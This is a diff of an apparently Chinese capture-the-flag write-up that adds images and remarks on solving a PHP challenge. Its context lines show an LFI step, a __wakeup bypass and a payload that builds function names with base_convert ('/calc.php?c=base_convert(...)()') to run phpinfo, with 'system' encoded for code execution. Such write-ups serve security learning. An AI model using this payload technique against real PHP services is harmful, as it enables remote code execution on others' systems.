@@ -96,6 +96,8 @@ GET参数中含有file, LFI获得index.php源码, 根据其内容继续获得hin
 2. `__wakeup` 绕过，[CVE-2016-7124](https://bugs.php.net/bug.php?id=72663)
 3. 每次调用getFlag token_flag都会随机变化，可以将token赋值为token_flag 的引用绕过
 
+{% asset_img EUhNFz4.png Source %}
+
 故exploit如下:
 
 ```php
@@ -171,6 +173,12 @@ if(!isset($_GET['c'])){
 
 验证: `url:/calc.php?c=base_convert(55490343972,10,36)()`
 可以执行phpinfo  
+
+比赛时受师傅的引导，将echo file_get_contents缩短为readfile，成功获得了flag
+
+{% asset_img SlwlDOA.png meme %}
+
+其实应该是可以RCE的
 
 > php > `echo base_convert('system', 36, 10);`
 > 1751504350
